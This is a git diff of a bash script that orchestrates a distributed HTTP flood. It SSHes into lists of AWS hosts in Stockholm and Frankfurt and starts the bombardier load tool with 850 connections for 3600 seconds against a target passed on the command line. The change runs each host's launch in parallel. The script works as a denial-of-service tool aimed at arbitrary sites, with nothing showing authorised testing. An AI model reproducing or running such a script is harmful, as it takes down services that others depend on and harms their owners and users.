@@ -8,10 +8,10 @@ STOCKHOLM=()
 FRANKFURT=()
 
 main(){
-	echo "Stockholm fires on $1"
+	echo "Stockholm fires on $1 by:"
 	fire "key-stockholm-1.pem" ${1} "${STOCKHOLM[@]}"
 
-	echo "Frankfurt fires on $1"
+	echo "Frankfurt fires on $1 by:"
 	fire "key-frankfurt-1.pem" ${1} "${FRANKFURT[@]}"
 }
 
@@ -22,9 +22,22 @@ fire(){
 
 	for ip in ${@}
 	do
-		echo "Fire on ${target} by ${ip}"
-		ssh -i "${key}" -o "StrictHostKeyChecking no" "ubuntu@${ip}" screen -dm sudo docker run -ti --rm alpine/bombardier -c 850 -d 3600s -l ${target}
+		process ${key} ${target} ${ip} &
 	done
+}
+
+process(){
+	echo "${3}"
+	ssh \
+		-i "${1}" \
+		-o "StrictHostKeyChecking no" "ubuntu@${3}" \
+		screen \
+			-dm sudo docker run \
+			-ti \
+			--rm alpine/bombardier \
+			-c 850 \
+			-d 3600s \
+			-l ${2}
 }
 
 ./checkAWS.sh && main ${@} || ./awsCliNa.sh
